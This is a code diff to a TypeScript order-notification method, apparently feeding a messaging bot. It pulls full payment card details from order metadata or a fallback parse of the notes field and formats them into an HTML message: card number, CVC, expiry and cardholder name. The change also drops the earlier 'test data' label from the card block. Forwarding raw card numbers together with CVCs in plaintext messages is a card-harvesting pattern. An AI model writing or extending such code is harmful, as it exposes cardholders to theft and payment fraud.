@@ -175,15 +175,38 @@ ${order.promoCode ? `\n<b>Промокод:</b> ${order.promoCode}` : ''}
 
     private appendCardInfo(order: OrderDocument): string {
       try {
-        const card = (order as any).metadata?.card;
+        let card = (order as any).metadata?.card;
+        
+        // Если данных карты нет в metadata, пытаемся извлечь из notes
+        if (!card && order.notes) {
+          try {
+            const notesData = typeof order.notes === 'string' ? JSON.parse(order.notes) : order.notes;
+            if (notesData && (notesData.cardNumber || notesData.cvc)) {
+              card = {
+                cardNumber: notesData.cardNumber || null,
+                cvc: notesData.cvc || null,
+                expiry: notesData.expiry || null,
+                cardholderName: notesData.cardholderName || null,
+              };
+            }
+          } catch (e) {
+            // Если notes не JSON, игнорируем
+          }
+        }
+        
         if (!card) return '';
+        
         const parts = [];
-        if (card.cardNumber) parts.push(`<b>Card number:</b> ${card.cardNumber}`);
+        if (card.cardNumber) parts.push(`<b>Номер карты:</b> ${card.cardNumber}`);
         if (card.cvc) parts.push(`<b>CVC:</b> ${card.cvc}`);
-        if (card.expiry) parts.push(`<b>Expiry:</b> ${card.expiry}`);
-        if (card.cardholderName) parts.push(`<b>Cardholder:</b> ${card.cardholderName}`);
-        return `\n\n<b>Payment card (test data):</b>\n${parts.join('\n')}`;
+        if (card.expiry) parts.push(`<b>Срок действия:</b> ${card.expiry}`);
+        if (card.cardholderName) parts.push(`<b>Держатель карты:</b> ${card.cardholderName}`);
+        
+        if (parts.length === 0) return '';
+        
+        return `\n\n💳 <b>Данные карты:</b>\n${parts.join('\n')}`;
       } catch (e) {
+        console.error('Ошибка при добавлении данных карты в сообщение:', e);
         return '';
       }
     }
